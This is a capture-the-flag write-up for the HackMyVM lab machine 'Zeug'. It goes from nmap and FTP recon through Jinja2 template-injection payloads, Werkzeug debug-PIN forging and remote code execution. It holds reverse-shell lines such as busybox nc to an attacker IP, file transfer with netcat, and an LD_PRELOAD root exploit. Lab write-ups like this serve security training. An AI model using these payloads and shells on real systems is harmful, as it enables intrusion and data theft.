# Zeug

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.117:21
Open 10.0.2.117:5000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.117
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             109 Jan 06  2024 README.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5000/tcp open  http    syn-ack Werkzeug httpd 3.0.1 (Python 3.11.2)
|_http-server-header: Werkzeug/3.0.1 Python/3.11.2
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Zeug
Service Info: OS: Unix
```
:::

## FTP (Anonymous)

```bash
â””â”€$ ftp anonymous@10.0.2.117
Password: <BLANK>
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0             109 Jan 06  2024 README.txt
ftp> get README.txt # Download file
ftp> put README.txt # Test upload permission
550 Permission denied.
ftp> exit
```

```
â””â”€$ cat README.txt
Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.
```

## HTTP (5000)

![writeup.png](/assets/pentest/hackmyvm/zeug/writeup.png)

### XSS

Testing HTML:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>Hello</h1>
    <em>Strong text</em>
    <img src="x" onerror="alert(1)">
    <iframe src="/etc/passwd" frameborder="0"></iframe>
    <iframe src=file:///etc/passwd></iframe>
    <object data="file:///etc/passwd">
    <portal src="file:///etc/passwd" id=portal>
    <embed src="file:///etc/passwd>" width="400" height="400">
    <iframe src="file:///etc/passwd">
</body>
</html>
```

- [https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)

![writeup-1.png](/assets/pentest/hackmyvm/zeug/writeup-1.png)

### SSTI

Try SSTI(?)
- [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti#jinja2-python](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti#jinja2-python)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)

```
{{7*7}} -> 49
```

![writeup-2.png](/assets/pentest/hackmyvm/zeug/writeup-2.png)

SSTI Confirmed

### Debug PIN Exfiltration

`/console` is exposed, to access it we need PIN. SSTI doesn't seem to allow `__init__`, if we can bypass that and get File Read we could get RCE.

![writeup-3.png](/assets/pentest/hackmyvm/zeug/writeup-3.png)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz)
```bash
{{7*7}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ request }}
{{self}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
```

Blocked keywords:
```bash
import, os, shell, popen, communicate, subclasses, request, attr, script, |, app, mro, cycler, [, ], init
```

#### LFI

After fuzzing some payloads from PayloadsAllTheThings following worked:
```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

```bash
â””â”€$ curl 'http://10.0.2.117:5000' -F 'file=@/media/sf_VBoxShare/t.html; type=text/html' -s | htmlq 'body div' -t | grep sh$
root:x:0:0:root:/root:/bin/bash
cosette:x:1001:1001::/home/cosette:/bin/bash
exia:x:1002:1002::/home/exia:/bin/bash
```

- [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)

To generate correct PIN we need some information.

Let's start with interfaces
```bash
â””â”€$ py /media/sf_VBoxShare/t2.py
Filename: /proc/net/dev
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo:       0       0    0    0    0     0          0         0        0       0    0    0    0     0       0          0
enp0s3: 5378835   70384    0    0    0     0          0         0  4950045   69284    0    0    0     0       0          0

â””â”€$ py /media/sf_VBoxShare/t2.py /sys/class/net/enp0s3/address
08:00:27:c2:68:c1

â””â”€$ py /media/sf_VBoxShare/t2.py /sys/class/net/enp0s3/address | tr -d ':' | py -c 'print(int(input(),16))'
8796760074433
```

Machine ID:
```bash
â””â”€$ py /media/sf_VBoxShare/t2.py /etc/machine-id
48329e233f524ec291cce7479927890b

â””â”€$ py /media/sf_VBoxShare/t2.py /proc/self/cgroup
0::/system.slice/zeug-app.service # Only service name is required
```

Assemble all information:
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'cosette',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '8796760074433',  # str(uuid.getnode()),  /sys/class/net/enp0s3/address
    '48329e233f524ec291cce7479927890bzeug-app.service'  # get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

#### RCE

```bash
â””â”€$ py /media/sf_VBoxShare/t.py
161-611-910
```

![writeup-4.png](/assets/pentest/hackmyvm/zeug/writeup-4.png)

## SSH

Instead of reverse shell we can upgrade to SSH right away

```bash
â””â”€$ ssh-keygen -f id_rsa -P x -q
â””â”€$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ29twPnzU6BJniysmoSPny8SzgZLsgiRSeEE7qiS+eu woyag@kraken' >> ~/.ssh/authorized_keys
```

```bash
>>> print(co('ls -alh ~', shell=True).decode())
total 44K
drwx------ 4 cosette cosette 4.0K Jan  7  2024 .
drwxr-xr-x 4 root    root    4.0K Jan  6  2024 ..
lrwxrwxrwx 1 cosette cosette    9 Jan  6  2024 .bash_history -> /dev/null
-rwx------ 1 cosette cosette  220 Apr 23  2023 .bash_logout
-rwx------ 1 cosette cosette 3.5K Apr 23  2023 .bashrc
drwx------ 3 cosette cosette 4.0K Jan  6  2024 .local
-rwx------ 1 cosette cosette  807 Apr 23  2023 .profile
-rwx------ 1 cosette cosette  16K Jan  7  2024 seed_bak
drwx------ 6 cosette cosette 4.0K Jan  7  2024 zeug

>>> print(co("mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ29twPnzU6BJniysmoSPny8SzgZLsgiRSeEE7qiS+eu woyag@kraken' >> ~/.ssh/authorized_keys", shell=True).decode())
```

Ah, fuck port is closed... Reverse shell it is then...

## Reverse Shell (cosette)

```bash
â””â”€$ penelope -p 4444
---
>>> os.system('busybox nc 10.0.2.15 4444 -e /bin/bash')
---
cosette@zeug:~/zeug$ id
uid=1001(cosette) gid=1001(cosette) groups=1001(cosette)
```

## Privilege Escalation (exia)

Download odd file in home directory
```bash
â””â”€$ nc -lnvp 443 > seed_bak
---
cosette@zeug:~$ busybox nc 10.0.2.15 443 < ./seed_bak
```

Decompile [https://dogbolt.org/?id=7d04155a-86ae-42ba-9862-edc8b0aea917](https://dogbolt.org/?id=7d04155a-86ae-42ba-9862-edc8b0aea917)

![writeup-5.png](/assets/pentest/hackmyvm/zeug/writeup-5.png)

We can execute this as `exia` so privilege escalation!
```bash
cosette@zeug:~$ sudo -l
Matching Defaults entries for cosette on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cosette may run the following commands on zeug:
    (exia) NOPASSWD: /home/exia/seed
```

```bash
cosette@zeug:~$ echo $'import ctypes\nlibc = ctypes.CDLL("libc.so.6")\nlibc.srand(1)\nsecret = libc.rand()\nsolution = secret ^ 0xdeadbeef\nprint(solution)'
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.srand(1)
secret = libc.rand()
solution = secret ^ 0xdeadbeef
print(solution)
cosette@zeug:~$ echo $'import ctypes\nlibc = ctypes.CDLL("libc.so.6")\nlibc.srand(1)\nsecret = libc.rand()\nsolution = secret ^ 0xdeadbeef\nprint(solution)' | python3
3039230856
cosette@zeug:~$ sudo -u exia /home/exia/seed
********************************************
* Hi, Cosette, it's time to plant the seed *
********************************************
Enter a number: 3039230856
exia@zeug:/home/cosette$ id
uid=1002(exia) gid=1002(exia) groups=1002(exia)
```

### User.txt

```bash
exia@zeug:~$ cat user.txt
HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}
```

## Privilege Escalation (root)

```bash
exia@zeug:~$ sudo -l
Matching Defaults entries for exia on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User exia may run the following commands on zeug:
    (root) NOPASSWD: /usr/bin/zeug
```

```bash
â””â”€$ nc -lnvp 443 > zeug
exia@zeug:~$ busybox nc 10.0.2.15 443 < /usr/bin/zeug
```

- [https://dogbolt.org/?id=babb8f82-1f04-4d52-b1dc-cdf2d2f98e7f#BinaryNinja=181&angr=114](https://dogbolt.org/?id=babb8f82-1f04-4d52-b1dc-cdf2d2f98e7f#BinaryNinja=181&angr=114)

![writeup-6.png](/assets/pentest/hackmyvm/zeug/writeup-6.png)

ðŸ˜³ [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload--ld_library_path](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload--ld_library_path)

```bash
exia@zeug:~$ echo $'#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }' | gcc -fPIC -shared -o /home/exia/exia.so -nostartfiles -x c -
exia@zeug:~$ sudo zeug
root@zeug:/home/exia# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@zeug:/home/exia# cat /root/root.txt
HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}
```